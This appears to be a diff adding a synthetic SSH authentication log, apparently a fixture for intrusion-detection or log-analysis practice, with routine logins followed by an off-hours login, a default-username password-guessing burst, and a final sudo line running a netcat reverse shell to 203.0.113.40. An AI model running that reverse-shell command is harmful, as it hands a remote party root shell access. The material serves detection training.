@@ -1,0 +1,26 @@
+Jun 15 08:10:00 corp-server sshd[1001]: Accepted password for ahmed from 192.168.10.61 port 511 ssh2
+Jun 15 08:10:00 corp-server sshd[1002]: Accepted password for priya from 192.168.10.62 port 512 ssh2
+Jun 15 08:10:00 corp-server sshd[1003]: Accepted password for diego from 192.168.10.63 port 513 ssh2
+Jun 15 09:10:00 corp-server sshd[1004]: Accepted password for ahmed from 192.168.10.64 port 514 ssh2
+Jun 15 09:10:00 corp-server sshd[1005]: Accepted password for priya from 192.168.10.65 port 515 ssh2
+Jun 15 09:10:00 corp-server sshd[1006]: Accepted password for diego from 192.168.10.66 port 516 ssh2
+Jun 15 11:10:00 corp-server sshd[1007]: Accepted password for ahmed from 192.168.10.67 port 517 ssh2
+Jun 15 11:10:00 corp-server sshd[1008]: Accepted password for priya from 192.168.10.68 port 518 ssh2
+Jun 15 11:10:00 corp-server sshd[1009]: Accepted password for diego from 192.168.10.69 port 519 ssh2
+Jun 15 13:10:00 corp-server sshd[1010]: Accepted password for ahmed from 192.168.10.70 port 5110 ssh2
+Jun 15 13:10:00 corp-server sshd[1011]: Accepted password for priya from 192.168.10.71 port 5111 ssh2
+Jun 15 13:10:00 corp-server sshd[1012]: Accepted password for diego from 192.168.10.72 port 5112 ssh2
+Jun 15 15:10:00 corp-server sshd[1013]: Accepted password for ahmed from 192.168.10.73 port 5113 ssh2
+Jun 15 15:10:00 corp-server sshd[1014]: Accepted password for priya from 192.168.10.74 port 5114 ssh2
+Jun 15 15:10:00 corp-server sshd[1015]: Accepted password for diego from 192.168.10.75 port 5115 ssh2
+Jun 15 17:10:00 corp-server sshd[1016]: Accepted password for ahmed from 192.168.10.76 port 5116 ssh2
+Jun 15 17:10:00 corp-server sshd[1017]: Accepted password for priya from 192.168.10.77 port 5117 ssh2
+Jun 15 17:10:00 corp-server sshd[1018]: Accepted password for diego from 192.168.10.78 port 5118 ssh2
+Jun 15 04:05:00 corp-server sshd[9500]: Accepted password for diego from 192.168.10.77 port 51500 ssh2
+Jun 15 04:30:00 corp-server sshd[9601]: Failed password for invalid user root from 203.0.113.40 port 51601 ssh2
+Jun 15 04:30:25 corp-server sshd[9602]: Failed password for invalid user admin from 203.0.113.40 port 51602 ssh2
+Jun 15 04:30:50 corp-server sshd[9603]: Failed password for invalid user pi from 203.0.113.40 port 51603 ssh2
+Jun 15 04:31:15 corp-server sshd[9604]: Failed password for invalid user ubuntu from 203.0.113.40 port 51604 ssh2
+Jun 15 04:31:40 corp-server sshd[9605]: Failed password for invalid user guest from 203.0.113.40 port 51605 ssh2
+Jun 15 04:32:05 corp-server sshd[9606]: Failed password for invalid user oracle from 203.0.113.40 port 51606 ssh2
+Jun 15 04:40:00 corp-server sudo:    diego : TTY=pts/0 ; PWD=/home/diego ; USER=root ; COMMAND=/bin/nc -e /bin/sh 203.0.113.40 4444
